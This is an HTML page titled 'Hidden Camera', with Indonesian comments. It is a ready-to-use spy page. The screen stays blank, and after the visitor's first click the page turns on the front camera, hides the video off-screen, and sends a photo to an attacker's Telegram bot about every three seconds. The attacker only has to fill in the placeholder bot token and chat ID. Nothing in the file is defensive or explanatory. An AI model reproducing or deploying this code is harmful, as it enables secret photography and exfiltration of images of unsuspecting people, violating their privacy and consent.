<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Hidden Camera</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      background: black;
      color: black;
      overflow: hidden;
      user-select: none;
    }

    #video, #canvas {
      position: absolute;
      top: -9999px;
      left: -9999px;
      visibility: hidden;
    }
  </style>
</head>
<body>

  <!-- Elemen tersembunyi -->
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas"></canvas>

<script>
  const BOT_TOKEN = "ISI_TOKEN_ANDA";
  const CHAT_ID   = "ISI_CHAT_ID_ANDA";
  const JEDA_WAKTU = 3000;

  const video  = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  let counter = 0;
  let started = false;

  // âœ… AUTOSTART SETELAH 1x KLIK DI MANA SAJA
  document.body.addEventListener("click", () => {
    if (!started) {
      started = true;
      startSystem();
    }
  });

  async function startSystem() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // âœ… KAMERA DEPAN
        audio: false
      });

      video.srcObject = stream;

      video.onloadedmetadata = () => {
        loopProcess();
      };

    } catch (err) {
      console.error("Gagal kamera:", err);
    }
  }

  function loopProcess() {
    captureAndSend();
  }

  function captureAndSend() {
    if (video.videoWidth === 0) {
      setTimeout(loopProcess, 1000);
      return;
    }

    counter++;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
      uploadToTelegram(blob);
    }, "image/jpeg", 0.7);
  }

  function uploadToTelegram(imageBlob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", imageBlob, `front-${counter}.jpg`);
    formData.append("caption", `ðŸ“· Front Cam #${counter}`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    })
    .finally(() => {
      setTimeout(loopProcess, JEDA_WAKTU);
    });
  }
</script>

</body>
</html>
